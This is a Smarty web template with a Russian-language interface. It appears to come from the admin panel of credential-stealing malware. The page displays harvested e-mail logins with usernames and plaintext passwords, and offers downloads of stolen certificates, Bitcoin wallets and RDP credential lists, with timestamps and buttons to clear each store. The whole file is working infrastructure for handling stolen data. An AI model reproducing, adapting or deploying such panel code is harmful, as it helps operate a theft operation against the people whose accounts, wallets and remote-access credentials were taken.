{if $show_other_to_users || $priv_is_admin}
{assign var='no_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=other"}

{if {$smarty.request.routine|default:''} == 'confirm_clear_cert'}
{assign var='msg' value="Вы уверены, что хотите очистить список сертификатов?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=other&amp;routine=clear_cert"}
{include file='confirm.tpl'}
{/if}

{if {$smarty.request.routine|default:''} == 'confirm_clear_wallet'}
{assign var='msg' value="Вы уверены, что хотите очистить список кошельков?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=other&amp;routine=clear_wallet"}
{include file='confirm.tpl'}
{/if}

{if {$smarty.request.routine|default:''} == 'confirm_clear_email'}
{assign var='msg' value="Вы уверены, что хотите очистить список E-mail?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=other&amp;routine=clear_email"}
{include file='confirm.tpl'}
{/if}

{if {$smarty.request.routine|default:''} == 'confirm_clear_rdp'}
{assign var='msg' value="Вы уверены, что хотите очистить список RDP?"}
{assign var='yes_code' value={$smarty.server.SCRIPT_NAME}|cat:"?action=other&amp;routine=clear_rdp"}
{include file='confirm.tpl'}
{/if}
	{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_email">Скачать список E-mail</a><a class="download_zip" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_email&amp;zip=1"></a> (<b>{$total_email_items_count}</b> {$total_email_items_count|items})<br />
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_email_smtp">Скачать список E-mail (только SMTP)</a><a class="download_zip" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_email_smtp&amp;zip=1"></a> (<b>{$total_email_smtp_items_count}</b> {$total_email_smtp_items_count|items})<br />
	{/if}
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_cert">Скачать сертификаты</a> (<b>{$total_cert_items_count}</b> {$total_cert_items_count|items}{if isset($cert_last_import)}, последний получен <b>{$cert_last_import}</b>{/if})<br />
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_wallet">Скачать кошельки Bitcoin</a> (<b>{$total_wallet_items_count}</b> {$total_wallet_items_count|items}{if isset($wallet_last_import)}, последний получен <b>{$wallet_last_import}</b>{/if})<br />
	<a class="download_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_rdp">Скачать список RDP</a><a class="download_zip" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=download_rdp&amp;zip=1"></a> (<b>{$total_rdp_items_count}</b> {$total_rdp_items_count|items})<br />
	{if $priv_can_delete}
		<br />
		{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=confirm_clear_email">Очистить список E-mail</a> ({$total_email_table_size|file_size})<br />
		{/if}
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=confirm_clear_cert">Удалить сертификаты</a> ({$total_cert_table_size|file_size})<br />
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=confirm_clear_wallet">Удалить кошельки Bitcoin</a> ({$total_wallet_table_size|file_size})<br />
		<a class="delete_nav" href="{$smarty.server.SCRIPT_NAME}?token={$token}&amp;action=other&amp;routine=confirm_clear_rdp">Очистить список RDP</a><br />
	{/if}

	{if $enable_email_mode && ($show_email_to_users || $priv_is_admin)}
		<br />
		{if count($email_list)}
			<h4>Последние поступления E-mail</h4>
			<table id="table_email" width="800" cellspacing="0" summary="Latest E-mail additions">

			<tr>
				<th width="30%">E-mail адрес</th>
				<th width="15%">Пользователь</th>
				<th width="15%">Пароль</th>
				<th width="20%">E-mail клиент</th>
				<th width="20%">Время добавления</th>
			</tr>

			{foreach from=$email_list item=email_item}
				{assign var=img_file value="includes/design/images/modules/"|cat:$email_item.module|cat:".png"}
				{if file_exists($img_file)}
					{assign var=img_url value="<img style=\"margin-top:-2px;vertical-align:middle;\" src=\""|cat:$img_file|cat:"\" width=\"16\" height=\"16\" alt=\"\" /> "}
				{else}
					{assign var=img_url value=""}
				{/if}
	
				<tr>
	
				{if strlen($email_item.email) < 30}
				<td>
				{else}
				<td title="{$email_item.email}">
				{/if}
				{$email_item.email|truncate:30:'...':true:false}</td>
	
				{if strlen($email_item.user) < 13}
				<td>
				{else}
				<td title="{$email_item.user}">
				{/if}
				{$email_item.user|truncate:13:'...':true:false}</td>
	
				{if strlen($email_item.pass) < 13}
				<td>
				{else}
				<td title="{$email_item.pass}">
				{/if}
				{$email_item.pass|truncate:13:'...':true:false}</td>
	
				<td style="padding-bottom:2px">{$img_url nofilter}{$email_item.email_client}</td>
				<td>{$email_item.import_time}</td>
				</tr>
			{/foreach}
			</table><br />
		{else}
			<h4>Список E-mail пуст!</h4>
		{/if}
	{/if}

{else}
	{include file='error.tpl' err_code='ERR_NOT_ENOUGH_PRIVILEGES'}
{/if}

